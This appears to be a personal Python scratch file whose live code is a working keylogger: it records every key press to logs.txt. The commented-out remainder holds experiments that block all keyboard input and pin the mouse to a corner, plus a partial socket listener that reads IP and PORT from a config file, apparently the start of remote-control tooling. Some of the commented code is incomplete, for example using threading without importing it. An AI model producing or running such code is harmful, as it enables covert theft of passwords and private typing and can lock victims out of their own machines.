import keyboard #The keyboard module

def writer(data):
    with open("logs.txt","a") as file:
        file.write(data)

def filter(char):
	if char == "space":
		return " "
	elif len(char) > 1:
		return "[%s]" % char
	else:
		return char

def logger(event):
	writer(filter(event.name))

keyboard.on_press(logger)
keyboard.wait()



# import pyautogui
# import keyboard
# import time

# stopKey = "s" #The stopKey is the button to press to stop. you can also do a shortcut like ctrl+s
# maxX, maxY = pyautogui.size() #get max size of screen
# while True:
# 	if keyboard.is_pressed(stopKey):
# 		break
# 	else:
# 		pyautogui.moveTo(maxX/2, maxY/2) #move the mouse to the center of the screen


# pyautogui.FAILSAFE = False

# pyautogui.press(stopKey)



# print("blocking")
# for i in range(150):
# 	keyboard.block_key(i)


# time.sleep(3)

# print("unblocking")
# for i in range(150):
# 	keyboard.unblock_key(i)







# import keyboard
# # from pynput.mouse import Controller
# from time import sleep

# def blockinput():
#     global block_input_flag
#     block_input_flag = 1
#     t1 = threading.Thread(target=blockinput_start)
#     t1.start()
#     print("[SUCCESS] Input blocked!")
	

# def unblockinput():
#     blockinput_stop()
#     print("[SUCCESS] Input unblocked!")
	

# def blockinput_start():
#     mouse = Controller()
#     global block_input_flag
#     for i in range(150):
#         keyboard.block_key(i)
#     while block_input_flag == 1:
#         mouse.position = (0, 0)

# def blockinput_stop():
#     global block_input_flag
#     for i in range(150):
#         keyboard.unblock_key(i)
#     block_input_flag = 0


# blockinput()
# print("now blocking")
# sleep(5)
# print("now unblocking")

# keyboard.block_key(149)






# import socket, threading, time, sys, signal, os


# def signal_handling(signum, frame):
#     print("allright")

# signal.signal(signal.SIGINT,signal_handling)

# while True:
#     pass

# print("hello")


# try:
#     while True:
#         time.sleep(1)
#         print("Hello")
# except KeyboardInterrupt:
#     print("No more Hellos")











# from config import IP, PORT

# class Lis:
#     def __init__(self):
#         self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#         self.listener.bind((IP, PORT))

#         self.do_accept = True

#     def listen(self):
#         self.listener.listen(0)
#         connection, address = self.listener.accept()

#     def exit(self):
#         connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         connection.connect((IP, PORT))

#         self.listener.close()

# listener = Lis()

# listen_thread = threading.Thread(target=listener.listen)
# listen_thread.start()

# time.sleep(1)

# listener.exit()

# connection, address = listener.accept()
